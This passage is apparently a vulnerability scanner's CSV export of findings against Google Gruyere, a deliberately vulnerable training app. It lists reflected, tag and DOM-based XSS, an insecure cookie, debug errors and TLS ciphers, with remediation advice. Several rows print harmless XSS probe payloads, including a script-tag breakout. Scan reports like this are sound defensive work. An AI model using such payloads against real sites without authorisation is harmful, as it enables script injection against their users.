If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"e8c77401-96c0-4cc6-b546-332359fc8413",2022-03-15T21:06:17.432Z,2022-03-15T13:54:52Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/snippets.gtl?uid=cheddar' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"e9c39c2c-0508-427f-8581-3f4c71c5eb75",2022-03-15T18:42:41.743Z,2022-03-15T17:30:19Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TRACE request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/upload2'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert content directly into an HTML tag. For example `<INJECTION_HERE href=.......etc>` where `INJECTION_HERE` represents the location where the scanner payload was detected.","Cross Site Scripting",98105,"Cross-Site Scripting (XSS) in HTML tag",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"ec555f83-30da-47b3-b720-05ebfc4989ba",2022-03-15T21:06:17.432Z,2022-03-15T16:14:43Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | ' tenable_wasscan_xss_in_tag='c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd' blah='

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | ' tenable_wasscan_xss_in_tag='c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd' blah='

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","When the `secure` flag is set on a cookie, the browser will prevent it from being sent over a clear text channel (HTTP) and only allow it to be sent when an encrypted channel is used (HTTPS).

The scanner discovered that a cookie was set by the server without the secure flag being set. Although the initial setting of this cookie was via an HTTPS connection, any HTTP link to the same server will result in the cookie being sent in clear text.

Note that if the cookie does not contain sensitive information, the risk of this vulnerability is mitigated.","Web Applications",98064,"Cookie Without Secure Flag Detected",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A5], cwe=[614], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","https://www.owasp.org/index.php/SecureFlag",Low,"If the cookie contains sensitive information, then the server should ensure that the cookie has the `secure` flag set.",,"ece28a34-c529-476e-8bf8-e944b78adeda",2022-03-15T21:06:17.432Z,2022-03-15T16:41:46Z,"The scanner detected a cookie named 'GRUYERE' without the Secure flag set.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"eefa6b7d-271e-40ba-88cd-c32640a85795",2022-03-15T18:42:41.743Z,2022-03-15T17:50:48Z,"On http://google-gruyere.appspot.com/ debug error messages were detected. Please see the attached response for full details.
<b>WARNING:</b> Accessing or attacking a computer system without authorization is illegal in many jurisdictions. While doing this codelab",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"ef010872-14ca-41cb-a42b-f9213e84bcf3",2022-03-15T21:06:17.432Z,2022-03-15T14:01:02Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"f1275f9f-9212-43ad-a868-84b543cfde16",2022-03-15T21:06:17.432Z,2022-03-15T13:40:20Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Publishes the target information of the starting url as evaluated by the scan.",General,98136,"Target Information",,2017-07-27T00:00:00Z,2017-07-27T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"f1520036-1861-4f58-a448-e337196af8b1",2022-03-15T18:42:41.743Z,2022-03-15T16:42:37Z,"Access to URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/' has been confirmed.


Target Information
------------------------

Domain Name : google-gruyere.appspot.com
IP Address  : 172.217.1.116


Response Information
---------------------------

Status Code   : 200
Response Code : ok
Response Time : 0.314034s
Response Size : 3858 bytes
Content-Type  : text/html
",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"f25b7608-9436-4057-996b-fbb7d822b426",2022-03-15T21:06:17.432Z,2022-03-15T16:32:04Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/563265819128830739647592760263700851280/saveprofile' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"f481f711-c42b-4762-b3ca-e68c2786f2fb",2022-03-15T21:06:17.432Z,2022-03-15T16:21:37Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/feed.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"This plugin displays supported SSL/TLS cipher suites.",SSL/TLS,115491,"SSL/TLS Cipher Suites Supported",,2019-01-09T00:00:00Z,2021-07-16T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"f53fe7e9-a2d3-4e5e-84c2-3371a80aeccb",2022-03-15T18:42:41.743Z,2022-03-15T16:46:10Z,"Protocol     Cipher Suite Name (RFC)                
------------------------------------
TLS 1.1      TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA   
TLS 1.1      TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA   
TLS 1.1      TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA     
TLS 1.1      TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA     
TLS 1.1      TLS_RSA_WITH_AES_128_CBC_SHA           
TLS 1.1      TLS_RSA_WITH_AES_256_CBC_SHA           
TLS 1.1      TLS_RSA_WITH_3DES_EDE_CBC_SHA          
TLS 1.0      TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA   
TLS 1.0      TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA   
TLS 1.0      TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA     
TLS 1.0      TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA     
TLS 1.0      TLS_RSA_WITH_AES_128_CBC_SHA           
TLS 1.0      TLS_RSA_WITH_AES_256_CBC_SHA           
TLS 1.0      TLS_RSA_WITH_3DES_EDE_CBC_SHA          
TLS 1.3      TLS_AES_128_GCM_SHA256                 
TLS 1.3      TLS_AES_256_GCM_SHA384                 
TLS 1.3      TLS_CHACHA20_POLY1305_SHA256           
TLS 1.2      TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
TLS 1.2      TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305 
TLS 1.2      TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
TLS 1.2      TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA   
TLS 1.2      TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA   
TLS 1.2      TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256  
TLS 1.2      TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384  
TLS 1.2      TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA     
TLS 1.2      TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA     
TLS 1.2      TLS_RSA_WITH_AES_128_GCM_SHA256        
TLS 1.2      TLS_RSA_WITH_AES_256_GCM_SHA384        
TLS 1.2      TLS_RSA_WITH_AES_128_CBC_SHA           
TLS 1.2      TLS_RSA_WITH_AES_256_CBC_SHA           
TLS 1.2      TLS_RSA_WITH_3DES_EDE_CBC_SHA          
",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"f5d44711-3c93-4ebe-83f7-8be69909a4c2",2022-03-15T21:06:17.432Z,2022-03-15T14:01:01Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"f5f65654-dbf1-48d7-9fc1-1638289346ee",2022-03-15T21:06:17.432Z,2022-03-15T13:56:31Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile' by exploiting 'link' element named 'pw' and injecting following payload:

 | </textarea><script>window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink()</script>",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"f84cc45d-b3b1-4882-af24-0ef64409763b",2022-03-15T21:06:17.432Z,2022-03-15T17:14:31Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
